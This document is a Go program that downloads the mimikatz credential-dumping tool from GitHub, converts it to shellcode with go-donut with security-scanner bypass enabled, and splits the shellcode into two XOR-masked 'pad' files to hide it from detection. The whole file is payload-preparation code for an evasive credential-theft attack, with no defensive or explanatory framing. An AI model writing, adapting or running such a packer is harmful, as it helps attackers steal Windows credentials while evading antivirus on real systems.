package main

import (
	"archive/zip"
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"path"
	"runtime"
	"time"

	"github.com/Binject/go-donut/donut"
)

const mimikatzURL = `https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip`

var exePrefix, outputPath, stub string

func init() {
	switch runtime.GOARCH {
	case "amd64":
		exePrefix = "x64"
	case "386", "amd64p32":
		exePrefix = "Win32"
	default:
		fmt.Println("This arch is not compatible with mimikatz")
		os.Exit(0)
	}

	flag.StringVar(&outputPath, "o", "", "where to put the pads")
	flag.Parse()
	if len(outputPath) < 1 {
		flag.Usage()
		os.Exit(0)
	}
}

func checkFatalErr(err error) {
	if err != nil {
		panic(err)
	}
}

func main() {
	var mimikatz []byte

	resp, err := http.Get(mimikatzURL)
	checkFatalErr(err)
	zipFile, err := ioutil.ReadAll(resp.Body)
	checkFatalErr(err)
	zipReader, err := zip.NewReader(bytes.NewReader(zipFile), int64(len(zipFile)))
	checkFatalErr(err)
	for _, file := range zipReader.File {
		if path.Join(exePrefix, "mimikatz.exe") != file.Name {
			continue
		}
		fileHandle, err := file.Open()
		checkFatalErr(err)
		defer fileHandle.Close()
		mimikatz, err = ioutil.ReadAll(fileHandle)
		checkFatalErr(err)
		break
	}

	shellcode, err := donut.ShellcodeFromBytes(bytes.NewBuffer(mimikatz), &donut.DonutConfig{
		Arch:     donut.X84,
		Type:     donut.DONUT_MODULE_EXE,
		InstType: donut.DONUT_INSTANCE_PIC,
		Entropy:  donut.DONUT_ENTROPY_DEFAULT,
		Compress: 1,
		Format:   1,
		Bypass:   3,
	})

	pad1 := make([]byte, len(shellcode.Bytes()))
	pad2 := make([]byte, len(shellcode.Bytes()))
	rand.Seed(time.Now().UnixNano())
	for index, shellcodeByte := range shellcode.Bytes() {
		pad1[index] = byte(rand.Int())
		pad2[index] = pad1[index] ^ shellcodeByte
	}

	checkFatalErr(ioutil.WriteFile(path.Join(outputPath, "pad1"), pad1, 0777))
	checkFatalErr(ioutil.WriteFile(path.Join(outputPath, "pad2"), pad2, 0777))
}
